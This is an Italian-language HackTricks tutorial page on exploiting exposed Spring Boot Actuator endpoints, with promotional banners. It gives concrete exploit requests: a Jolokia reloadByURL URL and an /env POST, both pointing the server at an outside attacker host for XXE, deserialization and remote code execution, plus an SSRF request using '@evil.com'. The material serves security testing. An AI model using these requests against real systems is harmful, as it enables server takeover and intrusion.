# Spring Actuators

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## **Bypass di autenticazione di Spring**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**Da** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Sfruttare Spring Boot Actuators

**Controlla il post originale da** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Punti chiave:**

- Gli Actuators di Spring Boot registrano endpoint come `/health`, `/trace`, `/beans`, `/env`, ecc. Nelle versioni da 1 a 1.4, questi endpoint sono accessibili senza autenticazione. Dalla versione 1.5 in poi, solo `/health` e `/info` non sono sensibili per impostazione predefinita, ma gli sviluppatori spesso disabilitano questa sicurezza.
- Certi endpoint di Actuator possono esporre dati sensibili o consentire azioni dannose:
- `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart` e `/heapdump`.
- In Spring Boot 1.x, gli actuators sono registrati sotto l'URL radice, mentre in 2.x, sono sotto il percorso di base `/actuator/`.

### **Tecniche di sfruttamento:**

1. **Esecuzione remota di codice tramite '/jolokia'**:
- L'endpoint `/jolokia` di Actuator espone la libreria Jolokia, che consente l'accesso HTTP alle MBean.
- L'azione `reloadByURL` pu√≤ essere sfruttata per ricaricare le configurazioni di logging da un URL esterno, il che pu√≤ portare a XXE cieco o esecuzione remota di codice tramite configurazioni XML create ad hoc.
- Esempio di URL di exploit: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.

2. **Modifica della configurazione tramite '/env'**:
- Se sono presenti le librerie di Spring Cloud, l'endpoint `/env` consente la modifica delle propriet√† ambientali.
- Le propriet√† possono essere manipolate per sfruttare vulnerabilit√†, come la vulnerabilit√† di deserializzazione XStream nel serviceURL di Eureka.
- Esempio di richiesta POST di exploit:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

3. **Altre impostazioni utili**:
- Propriet√† come `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url` e `spring.datasource.tomcat.max-active` possono essere manipolate per vari exploit, come l'iniezione SQL o la modifica delle stringhe di connessione al database.

### **Informazioni aggiuntive:**

- Un elenco completo degli actuators predefiniti pu√≤ essere trovato [qui](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
- L'endpoint `/env` in Spring Boot 2.x utilizza il formato JSON per la modifica delle propriet√†, ma il concetto generale rimane lo stesso.

### **Argomenti correlati:**

1. **Env + H2 RCE**:
- Dettagli sull'utilizzo combinato dell'endpoint `/env` e del database H2 possono essere trovati [qui](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).

2. **SSRF su Spring Boot tramite interpretazione errata del nome del percorso**:
- La gestione dei parametri di matrice (`;`) nei nomi dei percorsi HTTP del framework Spring pu√≤ essere sfruttata per Server-Side Request Forgery (SSRF).
- Esempio di richiesta di exploit:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>
